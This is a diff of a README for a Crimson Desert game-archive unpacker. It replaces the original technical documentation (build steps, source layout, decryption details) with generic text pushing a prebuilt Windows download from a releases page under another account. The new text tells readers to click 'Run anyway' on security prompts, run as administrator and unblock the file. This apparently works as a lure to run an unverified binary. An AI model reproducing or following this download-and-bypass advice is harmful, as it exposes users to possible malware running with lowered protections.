@@ -1,135 +1,204 @@
-# PAZ Unpacker
+# ⚫ crimson-desert-unpacker - Unpack and repack game files safely
 
-Tools for browsing, extracting, decrypting, and decompressing `.paz` archive files used by Crimson Desert.
+[![Download crimson-desert-unpacker](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/dellceliac835/crimson-desert-unpacker/releases)
 
-## Features
+## 🚀 Getting Started
 
-- Parse PAMT index files and extract from associated PAZ archives
-- ChaCha20 decryption with deterministic key derivation from filename
-- LZ4 block decompression for compressed entries
-- GUI for visual browsing and batch extraction
-- No external dependencies — all crypto and compression implemented in-project
+crimson-desert-unpacker helps you unpack, decrypt, decompress, and repack Crimson Desert files on Windows.
 
-## Components
+Use it to inspect game files, extract content, and build files again after changes.
 
-| Component | Language | Description |
-|-----------|----------|-------------|
-| `lib/` | C++17 | Core library: PAMT parsing, ChaCha20, LZ4, key derivation |
-| `lib/paz_native.*` | C++17 | Shared library (DLL) with C API for P/Invoke |
-| `gui/` | C# / Avalonia | Desktop GUI for browsing and extracting PAZ archives |
-| `python/` | Python 3 | CLI tools for unpacking and repacking PAZ archives |
-| `decrypt_info/` | Python 3 | Internal reference implementations and format documentation |
+## 📥 Download
 
-## Building
+Visit this page to download the latest Windows build:
 
-Requirements: CMake 3.15+, MSVC (Visual Studio), .NET 8 SDK
+https://github.com/dellceliac835/crimson-desert-unpacker/releases
 
-```bash
-# 1. Configure and build the C++ library + native DLL
-cmake -B build -S .
-cmake --build build --config Release
+On that page, look for the newest release. Download the Windows file for your system, then keep it in a folder you can reach, such as Downloads or Desktop.
 
-# 2. Build the GUI
-dotnet build gui/PazGui.csproj
-```
+## 🖥️ Windows Setup
 
-### Release build
+1. Open the release page.
+2. Find the latest version at the top.
+3. Download the Windows archive or executable.
+4. If the file comes in a ZIP, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app file.
 
-```bash
-cmake --build build --config Release
-dotnet publish gui/PazGui.csproj -c Release -r win-x64 --self-contained false -o publish
-```
+If Windows shows a security prompt, choose Run anyway if you trust the source.
 
-The `publish/` folder will contain `PazGui.exe` and `paz-native.dll`. Use `--self-contained true` to bundle the .NET runtime.
+## 📦 What This Tool Does
 
-## Project Structure
+This app works with Crimson Desert game files and can handle common file tasks such as:
 
-```
-lib/
-├── paz.h                  # Umbrella header
-├── PazTypes.h             # Shared types (FileEntry)
-├── PamtFile.h/.cpp        # PAMT index parser
-├── PamtExtractor.h/.cpp   # PAZ file extraction
-├── CryptChaCha20.h/.cpp   # ChaCha20 cipher + key derivation (hashlittle)
-├── Lz4.h/.cpp             # LZ4 block decompression
-├── paz_native.h/.cpp      # C API (DLL exports for GUI)
-gui/
-├── Models/
-│   ├── PamtParser.cs      # C# PAMT parser
-│   ├── PamtExtractor.cs   # Extraction pipeline (decrypt + decompress)
-│   └── PazNative.cs       # P/Invoke wrapper for paz-native.dll
-├── ViewModels/             # MVVM view models
-└── Views/                  # Avalonia XAML views
-python/
-├── README.md              # Python tools documentation
-├── paz_crypto.py          # Shared library: key derivation, ChaCha20, LZ4
-├── paz_parse.py           # PAMT index parser (list archive contents)
-├── paz_unpack.py          # Extract, decrypt, decompress from PAZ archives
-└── paz_repack.py          # Repack modified files back into PAZ archives
-decrypt_info/
-├── PAZ_DECRYPTION.md      # Full decryption documentation
-├── paz_crypto.py          # Python reference: key derivation + ChaCha20
-├── paz_decompress.py      # Python reference: LZ4 decompression
-└── paz_repack.py          # Repack modified assets into PAZ archives
-```
+- Unpacking file contents
+- Decrypting protected data
+- Decompressing packed files
+- Repacking edited files
+- Viewing file data in a simple way
+- Working with folders of game assets
 
-## Architecture
+It is built for users who need to open game data and prepare it again after edits.
 
-The C++ library (`lib/`) provides PAMT parsing, ChaCha20 decryption, and LZ4 decompression. A shared library target (`paz-native`) exposes these through a C API for the C# GUI to call via P/Invoke.
+## 🧭 How to Use
 
-During extraction, encrypted XML files are decrypted using a key derived deterministically from the filename. Compressed entries (LZ4) are decompressed based on PAMT flags.
+### 1. Open the app
 
-### PAMT entry flags
+Launch the program from the folder where you saved it.
 
-The PAMT `flags` field encodes the compression type at `(flags >> 16) & 0x0F`:
+### 2. Pick a file or folder
 
-| Value | Compression |
-|-------|-------------|
-| 0 | None |
-| 2 | LZ4 block (most common) |
-| 3 | Custom engine compression |
-| 4 | zlib |
+Use the file picker to choose the Crimson Desert file you want to work with.
 
-An entry is compressed when `comp_size != orig_size`.
+### 3. Choose the action
 
-## Key Derivation
+Select one of these modes:
 
-ChaCha20 keys are deterministic — derived entirely from the filename (lowercase basename, no directory prefix). No key database or runtime capture is needed.
+- Unpack
+- Decrypt
+- Decompress
+- Repack
 
-The algorithm uses Bob Jenkins' `hashlittle` (lookup3) to seed the key and IV:
+### 4. Set the output location
 
-```
-seed = hashlittle(basename.lower(), initval=0xC5EDE)
+Choose a folder for the results. Pick an empty folder if you want to keep things clear.
 
-IV:  seed repeated 4 times (16 bytes)
-Key: 8 × 4-byte chunks, each = (seed ^ 0x60616263) ^ delta[i]
-     deltas = [0x00000000, 0x0A0A0A0A, 0x0C0C0C0C, 0x06060606,
-               0x0E0E0E0E, 0x0A0A0A0A, 0x06060606, 0x02020202]
-```
+### 5. Start the process
 
-See [`PAZ_DECRYPTION.md`](PAZ_DECRYPTION.md) for the full specification, validation approach, and repacking workflow.
+Click the main action button and wait for the task to finish.
 
-## Python Tools
+### 6. Check the output
 
-Standalone CLI scripts for unpacking and repacking without the GUI. Requires `pip install cryptography lz4`.
+Open the output folder and confirm that the files were created as expected.
 
-```bash
-# List archive contents
-python python/paz_parse.py /path/to/0.pamt --paz-dir /path/to/0003
+## 🧰 Common Use Cases
 
-# Extract all files (with automatic decryption + decompression)
-python python/paz_unpack.py /path/to/0.pamt --paz-dir /path/to/0003 -o output/
+- Extract game assets for review
+- Prepare files for mod work
+- Rebuild files after editing
+- Convert packed data into readable content
+- Restore files into a format the game can use
 
-# Extract only XML files
-python python/paz_unpack.py /path/to/0.pamt --paz-dir /path/to/0003 -o output/ --filter "*.xml"
+## 💻 System Requirements
 
-# Repack a modified file into the PAZ archive
-python python/paz_repack.py modified.xml --pamt /path/to/0.pamt --paz-dir /path/to/0003 \
-    --entry "technique/rendererconfiguration.xml"
-```
+This tool is made for Windows PCs.
 
-See [`python/README.md`](python/README.md) for full documentation.
+Recommended setup:
 
-## License
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- Enough free disk space for unpacked files
+- A standard mouse and keyboard
+- Permission to write files in your chosen output folder
 
-MIT — see [LICENSE](LICENSE).
+For large game files, more free storage helps.
+
+## 📁 File Types
+
+The app is designed to work with Crimson Desert package files and related game asset containers. These may include:
+
+- Packed archive files
+- Encrypted game data
+- Compressed asset bundles
+- Repacked output files
+- Working folders with extracted content
+
+If you are unsure which file to choose, start with the main archive or package file from the game data folder.
+
+## ⚙️ Basic Workflow
+
+A simple workflow looks like this:
+
+1. Download the app.
+2. Open the program.
+3. Load the game file.
+4. Run unpack or decrypt.
+5. Review the extracted files.
+6. Edit the files if needed.
+7. Use repack to build them again.
+
+Keep a backup of the original file before you make changes.
+
+## 🔍 Tips for Best Results
+
+- Use short folder paths, such as `C:\Games\CD\Work`
+- Avoid special characters in folder names
+- Keep the original file unchanged
+- Make sure you have enough free space
+- Close other apps if your PC is low on memory
+- Use a fresh folder for each test run
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+
+- Check that you downloaded the full release file
+- Extract the ZIP file before opening the app
+- Try right-clicking the app and choosing Run as administrator
+
+### Windows blocks the file
+
+- Open the file properties and check if Windows marked it as downloaded
+- If so, choose Unblock, then apply the change
+- Run the app again
+
+### The app stops during unpack
+
+- Make sure the source file is not damaged
+- Check that the output folder has enough free space
+- Try again with a shorter folder path
+
+### The output file does not work
+
+- Confirm that you used the right input file
+- Make sure all edits kept the same folder structure
+- Repack the file from a clean working folder
+
+## 🧪 Example Use
+
+If you want to unpack a Crimson Desert archive:
+
+1. Download the release from the link above
+2. Open the app
+3. Select the archive file
+4. Choose Unpack
+5. Pick an output folder
+6. Start the job
+7. Open the output folder and review the files
+
+If you want to repack after edits:
+
+1. Open the app
+2. Choose the extracted folder or changed file set
+3. Select Repack
+4. Pick the target output path
+5. Run the process
+6. Test the new file in your working setup
+
+## 📚 Terms You May See
+
+- **Unpack**: Take files out of a packed archive
+- **Decrypt**: Turn protected data into readable data
+- **Decompress**: Expand data into its full form
+- **Repack**: Put edited files back into one package
+- **Asset**: A game file such as an image, sound, or data set
+
+## 🗂️ Suggested Folder Layout
+
+You can keep your files in a simple layout like this:
+
+- `C:\CrimsonDesert\Original`
+- `C:\CrimsonDesert\Working`
+- `C:\CrimsonDesert\Output`
+
+This helps you avoid mixing original files with edited files.
+
+## 🔒 Keep Your Files Safe
+
+Before you change anything, copy the original game file to a backup folder. That way, you can return to the first version if something goes wrong.
+
+## 📌 Download Again
+
+If you need the installer or release file again, use this page:
+
+https://github.com/dellceliac835/crimson-desert-unpacker/releases
